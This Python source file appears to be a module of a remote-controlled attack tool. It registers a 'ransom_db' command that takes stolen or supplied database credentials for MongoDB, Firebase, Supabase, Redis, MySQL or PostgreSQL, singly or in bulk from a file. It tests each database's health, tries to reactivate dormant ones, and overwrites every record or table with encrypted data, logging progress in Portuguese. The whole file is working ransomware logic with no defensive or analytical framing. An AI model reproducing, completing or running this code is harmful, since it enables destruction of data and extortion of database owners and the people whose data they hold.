import asyncio
from typing import Any, Callable, Dict, List, Tuple

from application.client.dto.CommandOutputDto import CommandOutputDTO
from application.client.use_cases.DispatchCommand import DispatchCommandUseCase
from domain.service.INoSqlAdapter import INoSqlAdapter
from domain.service.ISqlAdapter import ISqlAdapter
from domain.service.SqlRansomDTO import SqlRansomDTO
from infra.service.RansomCripEngine import RansomCripEngine
from infra.service.SqlRansomIterator import SqlRansomIterator


_NOSQL_DBS = {"Firebase", "MongoDB"}
_SQL_DBS   = {"MySQL", "PostgreSQL"}
_REST_DBS  = {"Supabase", "Redis"}

_EXAMPLE_CONTENT: dict = {
    "MongoDB": (
        "mongodb://usuario:senha@host:27017/banco\n"
        "mongodb://usuario2:senha2@host:27017/banco2\n"
    ),
    "Firebase": (
        "/caminho/para/serviceAccount1.json\n"
        "/caminho/para/serviceAccount2.json\n"
    ),
    "Supabase": (
        "https://xxx.supabase.co|eyJhbGciOiJIUzI1NiJ9.TOKEN1\n"
        "https://yyy.supabase.co|eyJhbGciOiJIUzI1NiJ9.TOKEN2\n"
    ),
    "Redis": (
        "redis://usuario:senha@host:6379/0\n"
        "redis://usuario2:senha2@host:6379/1\n"
    ),
    "MySQL": (
        "localhost|3306|root|senha123|meu_banco\n"
        "localhost|3306|user2|senha456|outro_banco\n"
    ),
    "PostgreSQL": (
        "localhost|5432|postgres|senha123|meu_banco\n"
        "localhost|5432|user2|senha456|outro_banco\n"
    ),
}


class RansomDbModule:

    def __init__(self, broadcast: Callable) -> None:
        self._broadcast = broadcast

    def install(self, dispatcher: DispatchCommandUseCase) -> None:
        dispatcher.register("ransom_db", self._handle_ransom_db)

    async def _handle_ransom_db(self, data: Dict[str, Any]) -> CommandOutputDTO:
        db   = data.get("db", "")
        mode = data.get("mode", "single")

        if db not in (_NOSQL_DBS | _SQL_DBS | _REST_DBS):
            return CommandOutputDTO.fail(
                f"Banco '{db}' não suportado. "
                f"Opções: {sorted(_NOSQL_DBS | _SQL_DBS | _REST_DBS)}"
            )

        if mode == "example":
            output_path = data.get("output_path", f"exemplo_{db.lower()}.txt")
            return self._generate_example(db, output_path)

        try:
            uris = self._resolve_uris(mode, data)
        except (FileNotFoundError, ValueError) as e:
            return CommandOutputDTO.fail(str(e))

        if not uris:
            return CommandOutputDTO.fail("Nenhuma URI encontrada para processar")

        await self._push_log(f"[*] {len(uris)} URI(s) · banco: {db}")

        from infra.service.DatabaseHealthChecker import get_health_checker, DbStatus
        checker = get_health_checker(db)

        total = 0
        for i, uri in enumerate(uris, start=1):
            await self._push_log(f"[*] ({i}/{len(uris)}) {self._mask(uri)}")

            diag = checker.diagnose(uri)

            if diag.status == DbStatus.BAD_CREDS:
                await self._push_log(f"[!] {diag.message}")
                continue

            if diag.status == DbStatus.INACTIVE:
                await self._push_log(f"[!] {diag.message}")
                if diag.can_reactivate:
                    await self._push_log("[*] Tentando reativar...")
                    reactivated = checker.reactivate(uri)
                    await self._push_log(f"[!] {reactivated.message}")
                continue

            if diag.status == DbStatus.UNREACHABLE:
                await self._push_log(f"[!] {diag.message}")
                continue

            if diag.status == DbStatus.OVERLOADED:
                await self._push_log(f"[!] {diag.message}")
                continue

            if diag.status == DbStatus.READ_ONLY:
                await self._push_log(f"[!] {diag.message}")
                continue

            if diag.status != DbStatus.HEALTHY:
                await self._push_log(f"[!] {diag.message}")
                continue

            try:
                count = await self._process_uri(db, uri)
                total += count
                await self._push_log(f"[+] {count} valor(es) criptografado(s)")
            except Exception as e:
                await self._push_log(f"[!] Erro durante criptografia: {e}")

        return CommandOutputDTO.ok(
            {"encrypted": total, "db": db, "uris_processed": len(uris)},
            event="ransom_db_done",
        )

    async def _process_uri(self, db: str, uri: str) -> int:
        if db in _SQL_DBS:
            return self._run_sql(db, uri)
        return self._run_nosql(db, uri)

    def _run_nosql(self, db: str, uri: str) -> int:
        try:
            adapter = self._build_nosql_adapter(db, uri)
            engine  = RansomCripEngine()
            records = adapter.list_records()

            index = [0]
            def write_fn(enc: bytes) -> None:
                adapter.overwrite(index[0], enc)
                index[0] += 1

            engine.execute(write_fn, records)
            return index[0]
        except ConnectionError:
            raise
        except Exception as e:
            raise RuntimeError(f"NoSQL encryption failed for {db}: {e}")

    def _run_sql(self, db: str, uri: str) -> int:
        try:
            adapter  = self._build_sql_adapter(db, uri)
            engine   = RansomCripEngine()
            iterator = SqlRansomIterator()

            dto = SqlRansomDTO(
                engine          = engine,
                tables          = adapter.list_tables(),
                get_columns     = adapter.get_columns,
                end_transaction = adapter.end_transaction,
            )

            return iterator.run(dto)
        except ConnectionError:
            raise
        except Exception as e:
            raise RuntimeError(f"SQL encryption failed for {db}: {e}")

    def _generate_example(self, db: str, output_path: str) -> CommandOutputDTO:
        content = _EXAMPLE_CONTENT.get(db, f"# {db} — formato não definido\n")
        try:
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(content)
            return CommandOutputDTO.ok(
                {"file": output_path, "db": db}, event="ransom_db_done"
            )
        except Exception as e:
            return CommandOutputDTO.fail(str(e))

    def _build_nosql_adapter(self, db: str, uri: str) -> INoSqlAdapter:
        if db == "Firebase":
            from infra.adapters.nosql.FirebaseAdapter import FirebaseAdapter
            return FirebaseAdapter(uri)
        if db == "MongoDB":
            from infra.adapters.nosql.MongoAdapter import MongoAdapter
            return MongoAdapter(uri)
        if db == "Supabase":
            from infra.adapters.nosql.SupabaseAdapter import SupabaseAdapter
            return SupabaseAdapter(uri)
        if db == "Redis":
            from infra.adapters.nosql.RedisAdapter import RedisAdapter
            return RedisAdapter(uri)
        raise ValueError(f"Adapter NoSQL não implementado para '{db}'")

    def _build_sql_adapter(self, db: str, uri: str) -> ISqlAdapter:
        conn = self._to_sql_uri(db, uri)
        if db == "MySQL":
            from infra.adapters.sql.MySqlAdapter import MySqlAdapter
            return MySqlAdapter(conn)
        if db == "PostgreSQL":
            from infra.adapters.sql.PostgreSqlAdapter import PostgreSqlAdapter
            return PostgreSqlAdapter(conn)
        raise ValueError(f"Adapter SQL não implementado para '{db}'")

    def _to_sql_uri(self, db: str, raw: str) -> str:
        if "|" not in raw:
            return raw
        parts = raw.split("|")
        if len(parts) != 5:
            raise ValueError(
                f"Formato inválido: esperado host|porta|usuario|senha|banco, recebido: {raw!r}"
            )
        host, port, user, passwd, dbname = parts
        scheme = "postgresql" if db == "PostgreSQL" else "mysql"
        return f"{scheme}://{user}:{passwd}@{host}:{port}/{dbname}"

    def _resolve_uris(self, mode: str, data: Dict[str, Any]) -> List[str]:
        if mode == "single":
            uri = data.get("uri", "").strip()
            if not uri:
                raise ValueError("uri é obrigatória no modo single")
            return [uri]
        if mode == "file":
            path = data.get("file_path", "").strip()
            if not path:
                raise ValueError("file_path é obrigatório no modo file")
            return self._read_uris(path)
        raise ValueError(f"mode inválido: '{mode}'. Use 'single' ou 'file'")

    def _read_uris(self, path: str) -> List[str]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                return [
                    line.strip()
                    for line in f
                    if line.strip() and not line.startswith("#")
                ]
        except FileNotFoundError:
            raise FileNotFoundError(f"Arquivo não encontrado: {path}")

    def _mask(self, uri: str) -> str:
        return uri[:24] + "..." if len(uri) > 24 else uri

    async def _push_log(self, msg: str) -> None:
        try:
            result = self._broadcast(
                CommandOutputDTO.push_event("ransom_db_log", {"msg": msg})
            )
            if asyncio.iscoroutine(result):
                await result
        except Exception:
            pass
